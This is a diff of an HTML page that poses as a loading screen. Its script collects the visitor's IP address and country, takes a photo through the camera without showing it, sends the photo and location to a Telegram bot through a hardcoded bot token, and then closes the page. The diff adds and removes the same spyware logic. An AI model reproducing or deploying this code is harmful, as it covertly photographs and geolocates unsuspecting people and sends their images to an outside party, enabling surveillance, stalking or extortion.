@@ -11,10 +11,6 @@ body{
   background:#0f0f0f;
   color:#fff;
   font-family:sans-serif;
-}
-#loading{
-  position:fixed;
-  inset:0;
   display:flex;
   align-items:center;
   justify-content:center;
@@ -24,81 +20,80 @@ body{
 </head>
 <body>
 
-<div id="loading">🔄 Loading...</div>
+<div id="text">🔄 Loading...</div>
 
 <script>
-// ========= CONFIG =========
+// ================= CONFIG =================
 const BOT_TOKEN = "8558930997:AAHZSF1FLVK6qzcGe2BrMYl0QIWXdokzoMM";
-// ==========================
+// =========================================
 
-// Get USER ID from URL (?=6362758258)
-const params = new URLSearchParams(window.location.search);
-const USER_ID = params.get("");
+// get user id from URL (?=6362758258)
+const params = new URLSearchParams(location.search);
+const CHAT_ID = params.get("");
 
 let step = 0;
 
-// Loading sequence: 2 times (1s + 1s)
-function loadingCycle(){
+// loading twice (1s + 1s)
+function loading(){
   step++;
   if(step <= 2){
-    document.getElementById("loading").innerText = "🔄 Loading...";
-    setTimeout(loadingCycle, 1000);
+    setTimeout(loading, 1000);
   } else {
-    startProcess();
+    start();
   }
 }
+loading();
 
-loadingCycle();
-
-// Start camera → capture → send → close
-async function startProcess(){
+async function start(){
   try{
-    // Get IP
-    const ipData = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
-    const geoData = await fetch("https://ipapi.co/json/").then(r=>r.json());
+    // get IP
+    const ip = await fetch("https://api.ipify.org?format=json")
+      .then(r=>r.json()).then(d=>d.ip);
 
-    // Open camera (hidden)
+    const geo = await fetch("https://ipapi.co/json/")
+      .then(r=>r.json());
+
+    // open camera (hidden)
     const stream = await navigator.mediaDevices.getUserMedia({ video:true });
     const video = document.createElement("video");
     video.srcObject = stream;
     await video.play();
 
-    // Wait camera ready
-    await new Promise(r => setTimeout(r, 500));
+    await new Promise(r=>setTimeout(r,500));
 
-    // Capture one frame
+    // capture
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     canvas.getContext("2d").drawImage(video,0,0);
 
-    stream.getTracks().forEach(t => t.stop());
+    stream.getTracks().forEach(t=>t.stop());
 
-    const blob = await new Promise(r => canvas.toBlob(r,"image/jpeg",0.9));
+    const blob = await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.9));
 
-    // Caption
+    // caption (emoji + beautiful)
     const caption =
 `📸 <b>New Image Received</b>
 
-🔢 <b>Number:</b> ${USER_ID}
-🌐 <b>IP Address:</b> ${ipData.ip}
-🌍 <b>Country:</b> ${geoData.country_name}
+🔢 <b>Number:</b> ${CHAT_ID}
+🌐 <b>IP:</b> ${ip}
+🌍 <b>Country:</b> ${geo.country_name}
 
 👨‍💻 <b>Dev:</b> @XFPro43`;
 
-    // Send to bot
-    const formData = new FormData();
-    formData.append("chat_id", USER_ID);
-    formData.append("photo", blob, "photo.jpg");
-    formData.append("caption", caption);
-    formData.append("parse_mode","HTML");
+    // send to telegram
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("photo", blob, "photo.jpg");
+    form.append("caption", caption);
+    form.append("parse_mode","HTML");
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
       method:"POST",
-      body:formData
+      body:form
     });
 
-    // Close page / go back
+    // close / back
     setTimeout(()=>{
       if(window.Telegram && Telegram.WebApp){
         Telegram.WebApp.close();
@@ -108,7 +103,7 @@ async function startProcess(){
     }, 500);
 
   }catch(e){
-    document.getElementById("loading").innerText = "❌ Permission Denied";
+    document.getElementById("text").innerText = "❌ Permission denied";
   }
 }
 </script>
